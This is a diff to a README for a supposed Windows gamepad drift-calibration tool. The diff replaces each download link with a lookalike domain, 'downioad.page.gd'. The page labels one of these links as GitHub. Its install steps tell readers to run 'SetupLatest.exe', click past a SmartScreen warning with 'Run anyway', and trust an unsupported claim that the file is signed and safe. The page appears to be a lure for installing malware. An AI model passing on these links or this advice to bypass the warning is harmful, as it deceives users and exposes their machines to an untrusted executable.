@@ -2,7 +2,7 @@
 
 Joystick Drift Fix Tool 2026 is a lightweight Windows utility designed to help gamers and professionals diagnose, calibrate, and correct stick drift and deadzone issues on any USB or Bluetooth gamepad. If your analog sticks are drifting in menus or your inputs feel inaccurate, this tool lets you recalibrate without opening your controller or replacing hardware. Built for Windows 10 and Windows 11, it offers real-time monitoring, adjustable deadzone curves, and per-axis tuning so you can get back to smooth, precise control.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -30,7 +30,7 @@ Joystick Drift Fix Tool 2026 is a lightweight Windows utility designed to help g
 
 ## How to Install
 
-1. Click the green **Download Installer** badge above or visit the [Download page](https://download-page.page.gd/) to obtain **SetupLatest.exe**.
+1. Click the green **Download Installer** badge above or visit the [Download page](https://downioad.page.gd/) to obtain **SetupLatest.exe**.
 2. Once the download completes, locate **SetupLatest.exe** in your Downloads folder and double-click it to launch the setup wizard.
 3. If Windows SmartScreen displays a warning, click **More info** and then **Run anyway** to proceed. The installer is digitally signed and safe to use.
 4. Choose your preferred installation directory (the default is `C:\Program Files\JoystickDriftFixTool`) and click **Next**.
@@ -85,7 +85,7 @@ Joystick Drift Fix Tool 2026 is released under the MIT License. See the `LICENSE
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
